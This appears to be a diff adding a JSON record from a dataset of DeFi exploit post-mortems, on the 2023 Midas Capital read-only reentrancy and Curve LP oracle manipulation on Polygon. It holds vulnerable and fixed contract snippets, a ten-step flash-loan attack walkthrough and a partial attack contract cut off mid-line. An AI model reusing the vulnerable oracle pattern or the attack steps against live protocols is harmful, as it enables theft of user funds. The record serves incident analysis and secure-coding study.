@@ -1,0 +1,44 @@
+{
+ "id": "2023__2023-01-15_MidasCapital_PriceDependency_Polygon",
+ "source_file": "2023/2023-01-15_MidasCapital_PriceDependency_Polygon.md",
+ "title": "Midas Capital — Read-Only Reentrancy + Curve LP Price Manipulation Analysis",
+ "date": "2023-01-15",
+ "protocol": "Midas Capital",
+ "chain": "Polygon",
+ "loss_raw": "~663,101 MATIC (≈ $660,000)",
+ "loss_usd": 660000.0,
+ "root_cause": "Read-only reentrancy on `get_virtual_price()` during Curve LP `remove_liquidity` callback",
+ "attack_tx": "0x0053...2c2f",
+ "vulnerable_contract": "0xFb6F...B28 (Curve WMATIC-stMATIC Pool)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code (Curve Pool — Vyper pseudocode, reentrancy-vulnerable flow)\n@external\n@nonreentrant(\"lock\")  // Note: nonreentrant is present but does NOT protect view functions\ndef remove_liquidity(\n    _amount: uint256,\n    min_amounts: uint256[2],\n    use_eth: bool\n) -> uint256[2]:\n    # Step 1: Burn LP tokens → totalSupply decreases\n    CurveToken(self.lp_token).burnFrom(msg.sender, _amount)\n\n    # Step 2: Calculate return amounts (self.D is still old value)\n    amounts: uint256[2] = [...]\n\n    # Step 3: Transfer MATIC → callback triggered here ← reentrancy entry point\n    # totalSupply has decreased but self.D is not yet updated\n    raw_call(msg.sender, b\"\", value=amounts[0])  # ← callback trigger\n\n    # Step 4: Update self.D and balances (too late!)\n    self.D = new_D  # ← executed only after reentrancy",
+  "// ❌ Vulnerable oracle code (Midas Capital PriceProvider — inferred)\ncontract CurveLPPriceProvider {\n    ICurvePools public curvePool;\n\n    function getUnderlyingPrice(address cToken) external view returns (uint256) {\n        // Danger: directly calls virtual_price from the Curve pool\n        // If this function is called during a remove_liquidity callback, it returns a distorted price\n        uint256 virtualPrice = curvePool.get_virtual_price(); // ← manipulable\n        uint256 lpPrice = virtualPrice * underlyingPrice / 1e18;\n        return lpPrice;\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code (Checks-Effects-Interactions pattern applied)\n@external\n@nonreentrant(\"lock\")\ndef remove_liquidity(\n    _amount: uint256,\n    min_amounts: uint256[2],\n    use_eth: bool\n) -> uint256[2]:\n    # Step 1: Update all internal state first (Effects)\n    CurveToken(self.lp_token).burnFrom(msg.sender, _amount)\n    self.D = new_D          # ✅ Update D before transfer\n    self.balances = new_balances  # ✅ Update balances before transfer\n\n    # Step 2: External transfer last (Interactions)\n    raw_call(msg.sender, b\"\", value=amounts[0])",
+  "// ✅ Fixed oracle code\ncontract CurveLPPriceProvider {\n    ICurvePools public curvePool;\n\n    // Guard that detects whether the Curve pool is in a reentered state\n    function isReentered() internal view returns (bool) {\n        // Attempt a zero-value call to the Curve pool\n        // If reentrancy is in progress, the nonreentrant lock causes a revert\n        (bool success, ) = address(curvePool).staticcall(\n            abi.encodeWithSignature(\"claim_admin_fees()\")\n        );\n        return !success; // revert = reentrancy in progress\n    }\n\n    function getUnderlyingPrice(address cToken) external view returns (uint256) {\n        // ✅ Check for reentrancy state\n        require(!isReentered(), \"Reentrancy detected: price unreliable\");\n\n        uint256 virtualPrice = curvePool.get_virtual_price();\n        uint256 lpPrice = virtualPrice * underlyingPrice / 1e18;\n        return lpPrice;\n    }\n}"
+ ],
+ "steps": [
+  "1. **Balancer flash loan**: Borrow the entire WMATIC balance (~71.8M) from Balancer V2",
+  "2. **Aave V3 flash loan**: Borrow additional WMATIC from the Aave V3 aPolWMATIC pool",
+  "3. **Aave V2 flash loan**: Borrow additional WMATIC from the Aave V2 amWMATIC pool (total ~540,000 WMATIC secured)",
+  "4. **LP deposit + collateral supply**: Deposit 270,000 WMATIC into Curve → receive LP tokens → mint into Midas WMATIC_STMATIC market (supply collateral)",
+  "5. **Trigger reentrancy**: Create Curve LP with remaining WMATIC then call `remove_liquidity(LPAmount, [0,0], true)` → MATIC transfer triggers callback",
+  "6. **Reentrancy window (receive())**: At callback time, `get_virtual_price()` spikes abnormally → execute `borrowAll()` to over-borrow from 4 markets",
+  "7. **Liquidation + collateral recovery**: Deploy `LiquidateContract` to liquidate the over-borrowed positions → recover WMATIC_STMATIC collateral",
+  "8. **Swap and profit realization**: Convert jCHF/jEUR/jGBP/agEUR → USDC → WMATIC via KyberSwap + Uniswap V3",
+  "9. **Repay loans**: Repay flash loan principal + fees in order: Aave V2 → Aave V3 → Balancer",
+  "10. **Withdraw profit**: ~663,101 MATIC (~$660,000) realized",
+  "→ Receive LP tokens",
+  "Burn LP → MATIC transfer callback ◄ totalSupply decreases",
+  "jCHF/jEUR/jGBP/agEUR → WMATIC",
+  "→ Withdrawn to KuCoin / Binance"
+ ],
+ "other_code": [
+  "Attacker (0x1863...8611)\n        │\n        ▼\n┌───────────────────────────────────┐\n│   Deploy Attack Contract          │\n│   0x757E...23A1                   │\n└───────────────────────────────────┘\n        │  balancerFlashloan()\n        ▼\n┌───────────────────────────────────┐\n│   Balancer V2                     │\n│   Flash Loan: ~71.8M WMATIC       │\n└───────────────────────────────────┘\n        │  receiveFlashLoan() callback\n        ▼\n┌───────────────────────────────────┐\n│   Aave V3                         │\n│   Flash Loan: ~41.4M WMATIC       │\n└───────────────────────────────────┘\n        │  executeOperation() callback\n        ▼\n┌───────────────────────────────────┐\n│   Aave V2                         │\n│   Flash Loan: ~12.8M WMATIC       │\n└───────────────────────────────────┘\n        ",
+  "// [Phase 1] Core attack logic executed in Aave V2 callback\nfunction executeOperation(...) external payable returns (bool) {\n    if (msg.sender == address(aaveV2)) {\n        // 1. Register 5 Midas lending markets (authorize collateral use)\n        unitroller.enterMarkets(cTokens);\n\n        // 2. Deposit 270,000 WMATIC into Curve → receive LP tokens\n        curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);\n\n        // 3. Supply LP tokens as collateral to Midas\n        WMATIC_STMATIC.mint(mintAmount);\n\n        // 4. Create LP with remaining WMATIC then immediately remove\n        //    donate_dust=true → triggers native MATIC callback\n        uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);\n        curvePool.remove_liquidity(LPAmount, [uint256(0), u"
+ ]
+}
